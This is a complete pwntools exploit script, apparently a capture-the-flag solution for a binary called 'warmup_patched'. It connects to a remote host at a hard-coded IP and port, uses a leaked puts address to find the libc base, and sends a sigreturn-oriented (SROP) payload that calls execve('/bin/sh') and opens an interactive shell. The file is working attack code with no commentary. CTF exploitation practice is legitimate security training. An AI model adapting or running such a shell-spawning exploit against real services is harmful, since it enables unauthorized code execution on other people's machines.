#!/usr/bin/env python3

from pwn import *

exe = ELF("./warmup_patched")
libc = ELF("./libc-2.39.so.6")
ld = ELF("./ld-2.39.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


def main():
    #r = conn()
    r = remote("172.210.129.230", 1338)
    
    #srop
    puts = int(r.recvline().strip(), 16)
    libc.address = puts - libc.sym.puts
    pause()
    payload  = p64(libc.address + 0x00000000000dd237)
    payload += p64(15)
    payload += p64(libc.address + 0x000000000011b722)
    sframe = SigreturnFrame()
    sframe.rax = 0x3b
    sframe.rdi = next(libc.search(b"/bin/sh"))
    sframe.rsi = 0
    sframe.rdx = 0
    sframe.rip = libc.address + 0x000000000011b722
    payload += bytes(sframe)
    payload = payload.ljust(0x247, b"M")
    payload += p64(0x000000000040118e)
    payload += p64(exe.sym.name)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
